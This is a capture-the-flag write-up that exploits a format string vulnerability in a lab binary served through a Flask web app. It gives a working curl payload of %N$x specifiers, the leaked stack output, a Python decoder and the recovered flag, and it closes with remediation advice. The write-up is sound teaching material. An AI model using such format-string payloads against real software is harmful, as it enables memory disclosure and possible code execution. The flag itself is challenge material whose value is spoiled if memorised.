# Silent Leak

## Overview

**What was the challenge?** "A binary that prints exactly what you tell it to, verbatim. The flag is loaded in memory the moment the program starts. It never intends to show you, but it can be tricked into speaking."

**What were we given?** A remote target at `192.168.45.128:8084`. Connecting with raw `nc` returned an HTTP `400 Bad request syntax` error — the port is actually a **Flask/Werkzeug web app** that wraps a vulnerable binary, not a bare socket. The app exposes three endpoints:

- `GET /` — a "TAPROBANE FORMAT DIAGNOSTIC TERMINAL" form
- `GET /download` — the challenge binary itself
- `POST /run` (`code=` field) — runs our input through the binary and returns its output
- `POST /submit` (`flag=` field) — validates the recovered flag

---

## Recon

First thing I looked at: the downloadable binary.

```bash
curl -s -o diagnostic_binary http://192.168.45.128:8084/download
file diagnostic_binary
# diagnostic_binary: ELF 32-bit LSB executable, Intel i386, dynamically linked, not stripped
```

Not stripped → symbol names are intact, so `main` is easy to find. Disassembling it immediately revealed two things worth noticing:

1. A long run of `mov DWORD PTR [ebp-…]` instructions **before any input is read** — the program is writing a constant string onto its own stack frame at startup.
2. The user input is passed **directly** to `printf` as the format string.

---

## Analysis

**What was the vulnerability?** A classic **format string vulnerability**. The input flow is:

```c
char buf[128];
fgets(buf, 128, stdin);   // reads user input
printf(buf);              // BUG: user data used as the FORMAT string
```

Because `printf(buf)` is called instead of `printf("%s", buf)`, any `%x`, `%p`, or `%s` in our input is interpreted as a format specifier. Each `%x` pops the next 4-byte word off the stack (x86 cdecl varargs) and prints it as hex — letting us read stack memory that was never meant to be output.

**Why does the flag leak?** The flag is written onto the stack by `main()` itself:

```
80491d6: c7 45 d2 4d 41 48 41   mov DWORD PTR [ebp-0x2e], 0x4148414d  ; "MAHA"
80491dd: c7 45 d6 53 4f 4e 41   mov DWORD PTR [ebp-0x2a], 0x414e4f53  ; "SONA"
... (continued through the full flag) ...
804926b: call 8049070 <fgets@plt>     ; input buffer at [ebp-0xae]
80492b0: call 8049040 <printf@plt>    ; printf(user_input)
```

The flag lives at `ebp-0x2e` and the input buffer at `ebp-0xae`. That's a fixed offset of `0x80` (128) bytes — so the flag is a *deterministic distance* away from our input on the same stack frame. Walking the stack with `%N$x` specifiers lets us land exactly on those words.

---

## Exploitation

### Step 1 — Find the offset

The input buffer's first dword surfaced at vararg position 8, so the flag should appear ~32 dwords later (`0x80 / 4`). A quick sweep from `%30$x` to `%50$x` pinpointed it at `%38$x`–`%47$x`.

### Step 2 — Leak the words

POST the specifiers to `/run`:

```bash
curl -s -X POST http://192.168.45.128:8084/run \
  --data-urlencode 'code=X%38$x.%39$x.%40$x.%41$x.%42$x.%43$x.%44$x.%45$x.%46$x.%47$x'
```

Output (inside the `<pre>` block):

```
X414d0000.4f534148.667b414e.616d726f.74735f74.676e6972.6d656d5f.5f79726f.6b61656c.7d6465
```

### Step 3 — Decode

Each value is a little-endian 32-bit word; reassembling and stripping nulls recovers the flag (the `"MA"` prefix starts 2 bytes into the first word because `"MAHA"` straddles the `%38`/`%39` boundary):

```python
import struct

vals = [0x414d0000, 0x4f534148, 0x667b414e, 0x616d726f, 0x74735f74,
        0x676e6972, 0x6d656d5f, 0x5f79726f, 0x6b61656c, 0x7d6465]

raw = b''.join(struct.pack('<I', v) for v in vals)
flag = raw[2:].rstrip(b'\x00')  # skip the 2-byte lead, trim trailing nulls
print(flag.decode())
# MAHASONA{format_string_memory_leaked}
```

**Step 4 — Verify.** Submitting the key to `POST /submit` returned `FILE W-04 RECOVERED` with the flag confirmed.

---

## The Flag

```
MAHASONA{format_string_memory_leaked}
```

Found by leaking the words `%38$x` → `%47$x` off the stack — the flag was sitting in `main()`'s frame, 128 bytes above the input buffer, and was recovered by interpreting the leaked 32-bit values as little-endian ASCII.

---

## Remediation

As a developer, the root cause is one line: **never pass untrusted data to `printf` as the format string.**

1. **Use the format string explicitly.**
   ```c
   printf("%s", buf);      // correct
   /* printf(buf);         // vulnerable — user controls format specifiers */
   ```

2. **Compile with format-security warnings enabled.** `-Wformat -Wformat-security` (GCC/Clang) will flag `printf(buf)` at build time and, with `-Werror`, prevent it from shipping.

3. **Enable hardening flags.** Compile with `-fstack-protector-all` (canaries) and link with `-Wl,-z,relro,-z,now` (full RELRO) so even if a format-string write primitive (`%n`) is found, the GOT can't be trivially overwritten for RCE.

4. **Don't store secrets on the stack in plaintext.** Even in a CTF the flag was recoverable purely because it sat in the same frame as the vulnerable buffer. In real code, keep sensitive material out of predictable memory locations and clear buffers after use.

The bigger lesson: a format-string bug isn't just an information leak — `%n` turns the same primitive into an arbitrary memory **write**, which is what made CVE-2012-0809 (sudo) and countless other real-world bugs RCE-able rather than mere leaks.
